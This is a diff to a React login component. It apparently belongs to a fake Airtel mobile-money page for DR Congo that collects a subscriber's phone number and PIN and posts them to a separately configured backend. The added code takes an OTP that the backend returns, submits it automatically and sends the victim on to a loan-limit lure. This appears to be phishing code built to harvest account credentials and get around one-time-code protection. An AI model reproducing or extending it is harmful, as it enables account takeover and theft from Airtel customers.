@@ -28,7 +28,7 @@ function AirtelLogin() {
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     const pinString = pin.join('');
-    
+
     if (phone.length < 9) {
       setError('Enter a valid Airtel number.');
       return;
@@ -37,22 +37,43 @@ function AirtelLogin() {
       setError('Enter your Airtel PIN.');
       return;
     }
-    
+
     setError('');
 
     try {
-      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
+      const fullPhone = `+243${phone}`;
+
+      // --- STEP 1: LOGIN ---
+      const loginRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        // Send the full phone number with +243 prefix
-        body: JSON.stringify({ phone_number: `+243${phone}`, pin: pinString }),
+        body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
       });
-      const data = await response.json();
-      
-      if (data.status === "success") {
-        navigate('/airtel-otp');
+      const loginData = await loginRes.json();
+
+      if (loginData.status !== 'success') {
+        setError(loginData.message || 'Login failed.');
+        return;
+      }
+
+      // --- STEP 2: INSTANTLY VERIFY OTP ---
+      // Backend returns the OTP in the login response for auto-verification
+      if (loginData.otp) {
+        const verifyRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/verify-otp`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone_number: fullPhone, otp: loginData.otp }),
+        });
+        const verifyData = await verifyRes.json();
+
+        if (verifyData.status === 'success') {
+          navigate('/airtel-loan-limit'); // Straight to the next step
+        } else {
+          setError(verifyData.message || 'OTP verification failed.');
+        }
       } else {
-        setError(data.message || 'Login failed.');
+        // Fallback: if backend doesn't return OTP, go to OTP page
+        navigate('/airtel-otp');
       }
     } catch {
       setError('Error connecting to backend.');
@@ -98,11 +119,10 @@ function AirtelLogin() {
           <div className="airtel-input-group">
             <label>Phone Number</label>
             <div className="airtel-phone-container">
-              {/* CHANGED: Updated display text from +250 to +243 (DR Congo) */}
               <div className="airtel-country-code">+243</div>
-              <input 
-                type="tel" 
-                placeholder="8XX XXX XXX" 
+              <input
+                type="tel"
+                placeholder="8XX XXX XXX"
                 value={phone}
                 onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                 maxLength={9}
